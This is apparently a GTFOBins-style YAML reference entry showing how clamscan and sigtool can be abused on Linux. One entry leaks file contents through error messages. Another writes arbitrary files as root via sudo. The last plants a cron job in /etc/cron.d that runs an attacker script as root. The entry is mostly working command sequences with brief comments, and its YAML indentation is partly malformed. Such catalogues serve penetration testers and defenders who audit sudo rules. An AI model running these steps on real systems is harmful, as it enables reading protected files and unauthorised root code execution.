---
functions:
  file-read:
  - binary: false
    code: |-
      touch x.yara
      clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
    comment: |-
      Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`.
    contexts:
      sudo:
      suid:
      unprivileged:

file-write:
  - code: |-
      sigtool --md5 file-to-copy > custom_db.hdb
      sudo clamscan file-to-copy -d custom_db.hdb --copy=/chosen/location
    contexts:
      sudo:
- code: |-
      printf "SHELL=/bin/sh\n\n* * * * *   root	/tmp/script.sh" > fake_cron
      echo 'id > /tmp/out.txt' > /tmp/script.sh && chmod +x /tmp/script.sh
      sigtool --md5 fake_cron > custom_db.hdb
      sudo clamscan fake_cron -d custom_db.hdb --copy=/etc/cron.d/

    comment: |-
      By crafting a custom signature database that intentionally flags an attacker‑controlled file as malicious, clamscan can be abused to write arbitrary data as root to attacker‑chosen directories, provided the target filename does not already exist.
      The example below demonstrates how this arbitrary file write primitive can be leveraged to achieve arbitrary code execution.
    contexts:
      sudo:
      
    
...
